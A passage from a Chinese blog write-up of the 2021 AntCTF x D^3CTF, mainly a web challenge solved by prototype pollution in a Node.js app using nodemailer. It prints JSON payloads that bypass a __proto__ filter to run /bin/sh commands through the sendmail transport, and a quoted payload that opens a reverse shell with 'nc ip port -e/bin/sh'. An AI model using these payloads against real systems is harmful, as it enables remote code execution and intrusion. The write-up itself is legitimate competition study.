+  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">__proto__</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span>split <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> obj<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span> obj <span class="token operator">=</span> object<span class="token punctuation">)</span><span class="token punctuation">[</span>path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">)</span><span class="token punctuation">,</span> object<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>噢，原来它把 <code>__proto__</code> 给过滤掉了，难怪打不通。</p>
+<p>但是还有 <code>constructor: { prototype: { attachments: { path: '/readflag' } } }</code> 这样应该能绕过。</p>
+<p>直接写发现没有附件。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308024558092.png"></p>
+<p>还是需要用 <code>.</code> 来。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308024640208.png"></p>
+<p>这回思路就通了，就 <strong>找污染哪里能执行代码</strong> 呢。</p>
+<p>又去翻 nodemailer 的源码。</p>
+<p>根据文档 <a target="_blank" rel="noopener" href="https://nodemailer.com/transports/sendmail/">Sendmail transport</a>，发现可以传个 <code>args</code> 参数。</p>
+<p>跟进 <code>send</code> 源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nodemailer/nodemailer/blob/master/lib/sendmail-transport/index.js#L108">node_modules/nodemailer/lib/sendmail-transport/index.js#108</a></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308025427279.png"></p>
+<p>好家伙！</p>
+<p><strong>那就把 <code>path</code> <code>args</code> 给污染好了。</strong></p>
+<p>构造代码成下面这样。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> nodemailer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"nodemailer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">let</span> transporter <span class="token operator">=</span> nodemailer<span class="token punctuation">.</span><span class="token function">createTransport</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+	sendmail<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+	path<span class="token operator">:</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>
+	args<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+transporter<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span>
+	<span class="token punctuation">{</span>
+		<span class="token keyword">from</span><span class="token operator">:</span> <span class="token string">"sender@example.com"</span><span class="token punctuation">,</span>
+		to<span class="token operator">:</span> <span class="token string">"recipient@example.com"</span><span class="token punctuation">,</span>
+		subject<span class="token operator">:</span> <span class="token string">"Message"</span><span class="token punctuation">,</span>
+		text<span class="token operator">:</span> <span class="token string">"I hope this message gets delivered!"</span><span class="token punctuation">,</span>
+	<span class="token punctuation">}</span><span class="token punctuation">,</span>
+	<span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>envelope<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>messageId<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>再参考 <a target="_blank" rel="noopener" href="https://nikoeurus.github.io/2019/12/18/D^3ctf-ezts/">2019 D^3 CTF-ezts复现</a></p>
+<p>这题应该执行 <code>/readflag</code> 就能输出 <code>/flag</code>。</p>
+<p><strong>Payload:</strong></p>
+<p>先把 flag 读出来，再通过附件发邮件。</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"/readflag test"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"/readflag test"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.sendmail"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.path"</span><span class="token operator">:</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"/readflag&gt;/tmp/miao"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"temp"</span><span class="token punctuation">,</span> <span class="token property">"constructor.prototype.attachments.path"</span><span class="token operator">:</span> <span class="token string">"/tmp/miao"</span><span class="token punctuation">}</span></code></pre>
+<p>发现写的时候报错，但确实写入文件了。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308030017920.png"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023631060.png"></p>
+<p>最后在 邮件附件里拿到 flag</p>
+<p><code>d3ctf{01c185051349caebc42bf2a2bef08e9cca73b0f9bf680cf6406127081c6679eb}</code></p>
+<p>哇呜！！！！！终于出了！！！</p>
+<p>这题和队友从晚上 6.看到 11. 太顶了！</p>
+<p><del>可是比赛结束了</del> 呜呜呜</p>
+<p>问题不大，学到了许多。</p>
+<p>BTW, 读了一下根目录。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">total <span class="token number">876</span>
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> 05:08 <span class="token builtin class-name">.</span>
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> 05:08 <span class="token punctuation">..</span>
+-rwxr-xr-x    <span class="token number">1</span> root     root             <span class="token number">0</span> Mar  <span class="token number">5</span> 05:08 .dockerenv
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 bin
+drwxr-xr-x    <span class="token number">5</span> root     root           <span class="token number">340</span> Mar  <span class="token number">6</span> 04:35 dev
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">5</span> <span class="token number">16</span>:10 etc
+----------    <span class="token number">1</span> root     root            <span class="token number">71</span> Mar  <span class="token number">5</span> 03:52 flag
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 home
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 lib
+drwxr-xr-x    <span class="token number">5</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 media
+drwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 mnt
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 opt
+dr-xr-xr-x  <span class="token number">222</span> root     root             <span class="token number">0</span> Mar  <span class="token number">6</span> 04:35 proc
+---S-----x    <span class="token number">1</span> root     root        <span class="token number">803240</span> Feb <span class="token number">27</span> 07:56 readflag
+drwx------    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">6</span> 04:20 root
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">7</span> 00:21 run
+drwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 sbin
+drwxr-xr-x    <span class="token number">2</span> root     root          <span class="token number">4096</span> Feb <span class="token number">23</span> <span class="token number">19</span>:33 srv
+dr-xr-xr-x   <span class="token number">13</span> root     root             <span class="token number">0</span> Mar  <span class="token number">6</span> 04:35 sys
+drwxrwxrwt    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">7</span> <span class="token number">15</span>:25 tmp
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Feb <span class="token number">24</span> <span class="token number">21</span>:05 usr
+drwxr-xr-x    <span class="token number">1</span> root     root          <span class="token number">4096</span> Mar  <span class="token number">3</span> <span class="token number">15</span>:48 var</code></pre>
+<p><code>readflag</code> 有 <code>S</code>属性，能够临时提升权限来读取 <code>flag</code>。</p>
+<p>代码类似于</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<hr>
+<p>看了官方 WP，发现确实有一种污染环境变量的方法。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210312222313025.png" alt="解法二"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.p6.is/Abusing-Environment-Variables/">https://blog.p6.is/Abusing-Environment-Variables/</a></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"constructor.prototype.env"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"require('child_process').execSync('nc ip port -e/bin/sh')//"</span><span class="token punctuation">,</span><span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"-r /proc/self/environ"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"constructor.prototype.sendmail"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"constructor.prototype.shell"</span><span class="token operator">:</span> <span class="token string">"/bin/node"</span><span class="token punctuation">}</span></code></pre>
+
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>misc 其他题目的话，比如：</p>
+<ul>
+<li><p><strong>量子密钥分发</strong>（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Quantum_key_distribution">quantum key distribution</a>，QKD），用的应该是 <a target="_blank" rel="noopener" href="https://en.m.wikipedia.org/wiki/BB84">BB84 协议</a>。</p>
+<p>不过流量包提取不出来，赛后才发现确实就是 Python 序列化后的，可以导出 JSON 再提取 data 再反序列化</p>
+<p>网上找到的几个 <a target="_blank" rel="noopener" href="https://ctftime.org/event/809">Google Capture The Flag 2019 (Quals)</a> 的 Writeup：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md">https://github.com/shahar603/CTF-Writeups/blob/master/2019/Google%20CTF%202019%20Quals/Quantum_Key_Distribution.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/">https://sasdf.github.io/ctf/writeup/2019/google/crypto/qkd/</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/15844">https://ctftime.org/writeup/15844</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/18212">https://ctftime.org/writeup/18212</a></p>
+<p>看了官方 wp，好家伙，python 有个 pyshark 包能直接提取啊……</p>
+</li>
+<li><p>还有个 Robust </p>
+<p>每日网易云 keep doctors away 的，给的是 QUIC / HTTP3 的流量包，看上去像是 m3u8 推流的抓包。</p>
+<p>和喵喵春节闯关 Task2 的推流有点像，抓了个包发现也类似。</p>
+<p>先加载 SSLKEYLOGFILE 得到明文流量，但是不会提取 QUIC，太草了</p>
+<p>可以导出 JSON 然后写个脚本提取的，呜呜呜，我是fw（（（</p>
+<blockquote>
+<p>看了官方 wp，草，这题这么套娃的么。（</p>
+<p>流量解密完是加密的 m3u8 流，提取出密钥用 aes-128-cbc 解密，根据频谱发现是拨号上网的调制解调器（modem），解码完得到 base64 解密得到压缩包。再去网易云找到相同歌曲的歌词 json 进行明文攻击。得到的 txt 文档内容空白字符隐写，再 base85 解密得到 flag。</p>
+</blockquote>
+<p>BTW，还找了点 <strong>QUIC 相关的工具</strong>。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/quicwg/base-drafts/wiki/Tools#wireshark">a listing of tools</a> for analysing, debugging and visualising QUIC (and potentially the HTTP mapping). See also the <a target="_blank" rel="noopener" href="https://github.com/quicwg/base-drafts/wiki/Implementations">Implementations listing</a>.</p>
+<p><a target="_blank" rel="noopener" href="https://qvis.edm.uhasselt.be/"><strong>qvis</strong></a> —— Toolsuite for visualizing QUIC+HTTP/3 qlog and pcap files. Includes a  sequence diagram, congestion graph, multiplexing diagram and  packetization visualization. 一个 QUIC+HTTP/3 可视化的工具。（<a target="_blank" rel="noopener" href="https://github.com/quiclog/qvis">GitHub</a>）</p>
+</blockquote>
+</li>
+<li><p>有一题 shellgen2</p>
+<p>是输入 Python 代码，输出 PHP。验证逻辑是随机产生一段字符串，执行 Python 代码得到 PHP 代码，然后经过 waf 之后再执行 PHP。貌似个限制长度的 <strong>无字母数字 webshell</strong>。</p>
+<p>（喵喵迷茫</p>
+<blockquote>
+<p>BTW，<a target="_blank" rel="noopener" href="https://github.com/t0thkr1s/revshellgen"><strong>revshellgen</strong></a><br>Standalone script written in Python 3 for generating reverse shells easily without typing. It automates the boring stuff like URL encoding the command and setting up a listener.<br>一个自动生成多种语言的反弹 shell 的工具，还能同时打开端口监听。</p>
+</blockquote>
+</li>
+<li><p>etc.</p>
+</li>
+</ul>
+<p>被卡住太难受了，之后有空有机会再来复现吧。</p>
+<p>Pwn 有题 QEMU 逃逸的，喵喵从 misc 的角度来看的。</p>
+<p>题目在 docker 里搭了个 QEMU 虚拟机。flag 在 docker 里的（相对于虚拟机的） host 里，连接发现通过 <code>Ctrl-A C</code> 可以退出虚拟机到 monitor，把 flag 作为光驱挂载上去，但 <code>Ctrl-A C</code> 再进去发现读不出来，看别人 wp 发现需要往这个里面先写入其他字符串，足够长才能输出。然而有点问题这么打没打通，最后队友用 binary 的方法打通了，233333.</p>
+<p><strong>太顶了太顶了！</strong></p>
+<p>喵呜呜呜呜呜，我只会签到、问卷和这道来来回回的虚拟机了……</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308011058489.png"></p>
+<p>挤不进前20了，喵喵大哭。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308011138649.png"></p>
+<p>不过拿了个一血还是挺爽的！</p>
+<p>不对劲，本来说着随意写写的，怎么扯了这么多（</p>
+<p><em>（溜了溜了</em></p>
+<hr>
+<p>噢，Official Writeup 终于出来了！</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/D-3CTF/D3CTF-2021-Official-Writeup">https://github.com/D-3CTF/D3CTF-2021-Official-Writeup</a></p>
+<!--
+
+### Happy_Valentine's_Day
+
+> This is a romantic love letter💌, can you find the secret hidden in the letter?
+> Note: The server is reset every 10 minutes, please do not make any  changes or damage to the environment after getting the flag. 
+> **Please do not bruteforce or scan this challenge.** 
+> **Flag Format: d3ctf{this_is_a_sample_flag}**
+>
+> http://0aadb50322.lovely.d3ctf.io 
+
+
+
+![](CTF_2021Ant-D3CTF/image-20210307024409056.png)
+
+JAVA Spring 模板注入
+
+-->
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz/2021/03/09/CTF_2021Ant-D3CTF/">https://miaotony.xyz/2021/03/09/CTF_2021Ant-D3CTF/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <!-- 
+                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
+                        -->
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <!-- 
+                        <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
+                        </div> 
+                -->
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '116343b4650fce4789b6',
+        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
+        repo: 'miaotony.github.io',
+        owner: 'miaotony',
+        admin: "miaotony",
+        id: '2021-03-09T20-30-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/03/09/CTF_2021Ant-D3CTF/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/20.jpg" class="responsive-img" alt="CTF | 2021 AntCTF x D^3CTF WriteUp">
+                        
+                        <span class="card-title">CTF | 2021 AntCTF x D^3CTF WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前几天打了个AntCTF x D^3CTF，题目还是挺有难度的，喵喵只会签到问卷和虚拟机了，这就爬走。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/04/CTF_2021HgameWeek4/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/8.jpg" class="responsive-img" alt="CTF | 2021 Hgame Week4 WriteUp">
+                        
+                        <span class="card-title">CTF | 2021 Hgame Week4 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Hgame 2021完结撒花！这篇是第四周的writeup，这周题目好难啊喵呜。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MiaoTony&#39;s小窝<br />'
+            + '文章作者: MiaoTony<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
